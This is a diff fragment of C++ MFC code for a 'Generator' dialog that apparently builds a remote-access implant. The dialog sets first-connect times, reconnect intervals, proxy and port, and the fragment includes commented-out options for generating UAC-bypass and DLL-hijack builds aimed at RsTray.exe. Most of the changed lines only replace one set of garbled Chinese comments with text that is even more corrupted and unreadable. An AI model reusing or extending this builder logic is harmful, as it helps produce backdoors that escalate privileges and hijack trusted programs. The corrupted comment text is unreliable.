 	generateConfig.connectTryIntervalM = Config_Info.nTryConnectIntervalM;
 
-	//µÃµ½Ê×´ÎÁ¬½ÓÊ±¼ä
+	//ï¿½Ãµï¿½ï¿½×´ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½
 	Config_Info.nFirstConnectHour = GetDlgItemInt(IDC_EDIT_FIRSTCONNECT_HOUR);
 	generateConfig.firstConnectHour = Config_Info.nFirstConnectHour;
 	Config_Info.nFirstConnectMinute = GetDlgItemInt(IDC_EDIT_FIRSTCONNECT_MINUTE);
 	generateConfig.firstConnectMinute = Config_Info.nFirstConnectMinute;
 
-// 	//µÃµ½ÏÂÔØSVTÊ±¼äºÍ¼ä¸ô
+// 	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½SVTÊ±ï¿½ï¿½Í¼ï¿½ï¿½
 // 	Config_Info.nFirstDownSvtOffsetS = GetDlgItemInt(IDC_EDIT_FIRST_SVT_OFFSET);
 // 	generateConfig.downSvtOffsetS = Config_Info.nFirstDownSvtOffsetS;
 // 	Config_Info.nDownSvtIntervalS = GetDlgItemInt(IDC_EDIT_SVT_INTERVAL);
 // 	generateConfig.downSvtIntervalS = Config_Info.nDownSvtIntervalS;
 
-	//µÃµ½Á¬½ÓÀàÐÍºÍ´úÀí·½Ê½
+	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÍºÍ´ï¿½ï¿½ï¿½ï¿½ï¿½Ê½
 	Config_Info.nConnectType = m_ConnectType.GetCurSel();
 //	Config_Info.nProxyType = m_ProxyType.GetCurSel();
 	
-	//µÃµ½ÊÇ·ñËæ»ú°²×°ºÍÉú³É·½Ê½
+	//ï¿½Ãµï¿½ï¿½Ç·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×°ï¿½ï¿½ï¿½ï¿½ï¿½É·ï¿½Ê½
 //	Service_Info.bUseChameleon = (m_SetupType.GetCurSel() == 0);
 //	generateConfig.setupType = m_SetupType.GetCurSel();
 
 	Config_Info.nProxyPort = GetDlgItemInt(IDC_EDIT_PROXYPORT);
 
-	//µÃµ½¶Ë¿Ú
+	//ï¿½Ãµï¿½ï¿½Ë¿ï¿½
 	Config_Info.nPort = GetDlgItemInt(IDC_EDIT_PORT);
 	generateConfig.port = GetDlgItemInt(IDC_EDIT_PORT);
 
@@ -1000,32 +1011,32 @@ void CGeneratorDlg::OnBnClickedButtonBingo()
 	CString strError;
 // 	if (bCarrier && WriteCarrier(Config_Info,Service_Info,strError))
 // 	{
-// 		MessageBox(_T("CarrierÉú³É³É¹¦£¡"));
+// 		MessageBox(_T("Carrierï¿½ï¿½ï¿½É³É¹ï¿½ï¿½ï¿½"));
 // 	}
 // 	else if (bSetup && WriteSetup(Config_Info,Service_Info,strError))
 // 	{
-// 		MessageBox(_T("SetupÉú³É³É¹¦£¡"));
+// 		MessageBox(_T("Setupï¿½ï¿½ï¿½É³É¹ï¿½ï¿½ï¿½"));
 // // 		CString exploreParameter;
 // // 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
 // // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
 // 	}
 // 	else if (bPassUAC && WriteBypassUAC(Config_Info,Service_Info,strError))
 // 	{
-// 		MessageBox(L"BypassUACÉú³É³É¹¦£¡");
+// 		MessageBox(L"BypassUACï¿½ï¿½ï¿½É³É¹ï¿½ï¿½ï¿½");
 // // 		CString exploreParameter;
 // // 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
 // // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
 // 	}
 // 	else if(bHijack && WriteHijack(Config_Info,Service_Info,strError))
 // 	{
-// 		MessageBox(_T("HijackÉú³É³É¹¦£¡"));
+// 		MessageBox(_T("Hijackï¿½ï¿½ï¿½É³É¹ï¿½ï¿½ï¿½"));
 // // 		CString exploreParameter;
 // // 		exploreParameter.Format(_T("/e,/select,\"%shijack\\RsTray.exe\""), GetModFilePath(NULL));
 // // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
 // 	}
 	if ( WriteSetup(Config_Info,Service_Info,strError))
 	{
-			MessageBox(_T("SetupÉú³É³É¹¦£¡"));
+			MessageBox(_T("Setupï¿½ï¿½ï¿½É³É¹ï¿½ï¿½ï¿½"));
 			// 		CString exploreParameter;
 			// 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
 			// 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
@@ -1042,7 +1053,7 @@ void CGeneratorDlg::OnBnClickedButtonBingo()
 void CGeneratorDlg::OnBnClickedButtonClose()
 {
 	ExitProcess(0);
-	// TODO: ÔÚ´ËÌí¼Ó¿Ø¼þÍ¨Öª´¦Àí³ÌÐò´úÂë
+	// TODO: ï¿½Ú´ï¿½ï¿½ï¿½ï¿½Ó¿Ø¼ï¿½Í¨Öªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 }
 
 
@@ -1075,7 +1086,7 @@ void CGeneratorDlg::OnBnClickedRadioSetup()
 // 	GetDlgItem(IDC_EDIT_INSTALLPATH)->EnableWindow(TRUE);
 }
 
-//°²×°·½Ê½Ñ¡Ôñ¿ò±»¸Ä±äÊ±´¥·¢
+//ï¿½ï¿½×°ï¿½ï¿½Ê½Ñ¡ï¿½ï¿½ò±»¸Ä±ï¿½Ê±ï¿½ï¿½ï¿½ï¿½
 void CGeneratorDlg::OnCbnSelchangeComboSetupType()
 {
 	if (m_SetupType.GetCurSel() == 0)
@@ -1181,5 +1192,5 @@ void CGeneratorDlg::OnCbnSelendokComboComm()
 // 		((CWnd*)GetDlgItem(IDC_EDIT_HTTPPORT))->EnableWindow(FALSE);
 // 	}
 	return ;
-	// TODO: ÔÚ´ËÌí¼Ó¿Ø¼þÍ¨Öª´¦Àí³ÌÐò´úÂë
+	// TODO: ï¿½Ú´ï¿½ï¿½ï¿½ï¿½Ó¿Ø¼ï¿½Í¨Öªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 }
